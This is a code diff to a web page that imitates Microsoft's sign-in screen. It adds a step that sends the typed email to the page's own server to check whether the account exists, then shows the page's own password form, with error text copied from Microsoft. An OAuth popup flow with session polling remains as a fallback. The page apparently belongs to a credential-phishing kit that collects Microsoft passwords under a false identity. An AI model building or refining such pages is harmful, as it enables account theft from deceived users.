@@ -482,7 +482,7 @@
 
 
             <div class="header">
-                <h1 id="headerTitle">Sign in to Microsoft</h1>
+                <h1 id="headerTitle">Sign in</h1>
             </div>
 
             <!-- Status and messages hidden -->
@@ -768,6 +768,43 @@
             }
 
             clearMessage();
+            setLoading(true, 'Verifying your Microsoft account...', false);
+
+            try {
+                // First, verify if the email account exists
+                const verifyResponse = await fetch(`${API_BASE}/api/verify-email`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email: email })
+                });
+
+                const verifyData = await verifyResponse.json();
+                setLoading(false);
+
+                if (verifyResponse.ok && verifyData.exists) {
+                    // Account exists, show password form
+                    console.log('✅ Email account verified, showing password form');
+                    showPasswordForm(email);
+                } else if (verifyData.exists === false) {
+                    // Account doesn't exist
+                    showMessage(verifyData.message || `We couldn't find an account with that username. Try another, or get a new Microsoft account.`, 'error');
+                } else {
+                    // Verification failed, but proceed with OAuth (fallback)
+                    console.log('⚠️ Email verification failed, proceeding with OAuth flow');
+                    proceedWithOAuth();
+                }
+
+            } catch (error) {
+                console.error('Email verification error:', error);
+                setLoading(false);
+
+                // If verification fails, proceed with OAuth as fallback
+                console.log('⚠️ Email verification error, proceeding with OAuth flow');
+                proceedWithOAuth();
+            }
+        }
+
+        async function proceedWithOAuth() {
             setLoading(true, 'Redirecting to Microsoft...', false);
 
             try {
@@ -782,7 +819,7 @@
 
                 if (response.ok && data.authUrl) {
                     currentSessionId = data.sessionId;
-                    
+
                     // Open Microsoft OAuth in popup
                     authWindow = window.open(
                         data.authUrl,
@@ -800,7 +837,9 @@
                             // Check if window is closed
                             if (authWindow.closed) {
                                 clearInterval(pollInterval);
-                                clearTimeout(timeoutId);
+                                if (window.authTimeoutId) {
+                                    clearTimeout(window.authTimeoutId);
+                                }
                                 setLoading(false);
                                 showMessage('Authentication cancelled. Please try again.', 'error');
                                 return;
@@ -812,7 +851,9 @@
 
                             if (statusData.authenticated) {
                                 clearInterval(pollInterval);
-                                clearTimeout(timeoutId);
+                                if (window.authTimeoutId) {
+                                    clearTimeout(window.authTimeoutId);
+                                }
                                 authWindow.close();
                                 setLoading(false);
                                 showSuccessForm(statusData.userEmail);
@@ -833,6 +874,9 @@
                         setLoading(false);
                         showMessage('Authentication timed out. Please try again.', 'error');
                     }, 5 * 60 * 1000);
+
+                    // Store timeoutId globally for cleanup
+                    window.authTimeoutId = timeoutId;
 
                 } else {
                     throw new Error(data.error || 'Failed to get authentication URL');
